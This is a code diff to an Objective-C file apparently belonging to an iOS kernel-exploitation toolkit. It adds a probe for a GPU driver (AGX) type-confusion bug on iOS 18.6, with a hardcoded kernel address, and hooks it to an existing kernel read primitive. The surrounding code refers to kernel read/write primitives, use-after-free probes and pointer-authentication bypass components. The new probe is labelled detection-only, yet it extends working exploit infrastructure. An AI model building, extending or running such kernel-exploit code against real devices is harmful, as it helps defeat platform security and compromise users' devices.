@@ -48,6 +48,7 @@ extern kern_return_t mach_vm_deallocate(vm_map_read_t target_task, mach_vm_addre
 #import "exploit/krw_zone_write.h"  // clamped 0x20 writes — raw kwritebuf is 32-byte RMW
 #import "exploit/offsets.h"
 #import "exploit/ool-uaf-probe.h"
+#import "exploit/agx-typeconf-probe.h"
 #import "TaskRop/pac.h"         // off_proc_ro_pr_task / off_task_map
 #import "TaskRop/rc.h"           // kp_arm_thread_state64_internal, KP_TH_IN_MACH_EXCEPTION
 
@@ -3691,6 +3692,29 @@ static uint64_t ool_smr(uint64_t v) { return kpSMRDecode(v); }
     size_t n = ool_uaf_probe_run(cbuf, sizeof(cbuf), krw.self_task_va ? &krw : NULL);
     if (n) [r appendFormat:@"%s", cbuf];
     else   [r appendString:@"FAIL: ool_uaf_probe_run returned 0\n"];
+    return r;
+}
+
+/* ---- AGX stamp-slot type confusion (18.6: no safeMetaCast) ---- */
+
+static int agx_kread(uint64_t addr, void *buf, size_t len) {
+    return gPrimitives.kreadbuf ? (gPrimitives.kreadbuf(addr, buf, len) == 0 ? 0 : -1) : -1;
+}
+
++ (NSString *)agxTypeConfProbeReport {
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n=== AGX stamp-slot type confusion (18.6: no safeMetaCast) ===\n"];
+    kpNote(r, @"  handleChannelErrorEvent 0xfffffff00880ae2c — no type check on getElement(stamp_idx)");
+    kpNote(r, @"  detection only — no kernel writes");
+
+    agx_tc_krw_t krw;
+    memset(&krw, 0, sizeof(krw));
+    krw.kread = agx_kread;
+
+    static char cbuf[256 * 1024];
+    size_t n = agx_typeconf_probe_run(cbuf, sizeof(cbuf), &krw);
+    if (n) [r appendFormat:@"%s", cbuf];
+    else   [r appendString:@"FAIL: agx_typeconf_probe_run returned 0\n"];
     return r;
 }
 
